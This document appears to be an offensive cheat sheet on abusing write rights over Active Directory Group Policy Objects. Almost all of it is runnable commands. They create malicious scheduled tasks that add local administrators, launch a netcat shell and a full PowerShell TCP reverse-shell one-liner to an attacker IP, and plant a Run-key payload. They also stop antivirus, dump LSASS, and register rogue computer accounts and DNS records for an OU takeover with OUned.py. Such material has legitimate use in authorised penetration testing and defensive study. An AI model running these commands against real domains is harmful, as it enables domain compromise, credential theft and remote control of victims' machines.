# DACL Attacks on a Group Policy Object (GPO)

## 1) WriteProperty on a GPO

We can create an "evil" GPO with a scheduled task for example

##### With PowerView

    New-GPOImmediateTask -Verbose -Force -TaskName 'Update' -GPODisplayName 'weakGPO' -Command cmd -CommandArguments "/c net localgroup administrators user1 /add"

##### With SharpGPOAbuse

    ./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO"

OR simply, add our compromised user to the local administrator group

    .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "weakGPO" --UserAccount USER

Update GPO to run immediately

    gpupdate /force

# Linux

We can update a GPO with a scheduled task for example to obtain a reverse shell

    ./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "<GPO_ID>" -powershell -command "\$client = New-Object System.Net.Sockets.TCPClient('attacker_IP',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" -taskname "The task" -description "Important task" -user

Create a local admin

    ./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "<GPO_ID>"

## 2) CreateChild on Policies Cn + WriteProperty on an OU

It is possible to create a fully new GPO and link it to an existing OU

##### With RSAT module

    New-GPO -Name "New GPO" | New-GPLink -Target "OU=Workstation,DC=domain,DC=local"
    Set-GPPrefRegistryValue -Name "New GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /C \\path\to\payload" -Type ExpandString

After GPO refresh on the OU's machines, when the machines will restart the payload will be executed

## 3) Manage Group Policy Links

With this right or GenericWrite on a GPO we can manipulate its gPLink attribute in order to apply an evil GPO to all the children of a descendant OU, even the ones with adminCount=1.

### Machine

1) Create a new Windows Server virtual machine connected to the network and install the domain controler features on it. Register it under a subdomain of the current domain (evil.domain.local)

2) Create an empty GPO on this DC

3) Reset the machine account password (to remove the unprintable characters)

        Reset-ComputerMachinePassword
4) Stop the antivirus and dump the LSASS to retrieve the password

        lsassy -d 'evil.domain.local' -u administrator -p password <evil_DC_IP>

5) Create a new computer account on the target domain with a LDAP SPN and the same password as the created DC

        python3 addcomputer_LDAP_spn.py -computer-name EVIL -computer-pass <DC_PASS> 'domain.local'/user1:password

6) Create a new DNS record on the target domain to point the evil subdomain to the attacker machine

        python3 dnstool.py -u 'domain.local\user1' -p password -r 'evil' -a add -d <attacker_IP> <DC_IP>

7) Configure the OUned.py tool with the following example. The [SMB] section must be setup to embedded and just a share name

https://github.com/synacktiv/OUned?tab=readme-ov-file#configuration-file

8) Run OUned.py

        sudo python3 OUned.py --config config.ini

### User

1) Similarly, create an evil domain controler and a computer account with a LDAP SPN

2) Create a second evil DC with the same domain as the target domain (domain.local). As the first evil DC, reset and retrieve its password

3) Create a new SMB share on the second evil DC

        New-SmbShare -Name "evil" -Path "C:\Evil"
        Grant-SmbShareAccess -Name "evil" -AccountName "DOMAIN.LOCAL\administrator" -AccessRight Full

4) Create a new computer account on the target domain with the HOST SPN and add a DNS record resolving this machine to the attacker IP

        python3 addcomputer.py -method LDAPS -computer-name EVIL2 -computer-pass <DC2_PASS> 'domain.local'/user1:password
        python3 dnstool.py -u 'domain.local\user1' -p password -r 'evil2' -a add -d <attacker_IP> <DC_IP>

5) Configure the OUned.py tool with the following example. The [SMB] section must be setup to forwarded with the other information setup

https://github.com/synacktiv/OUned?tab=readme-ov-file#configuration-file

6) Run OUned.py

        sudo python3 OUned.py --config config.ini

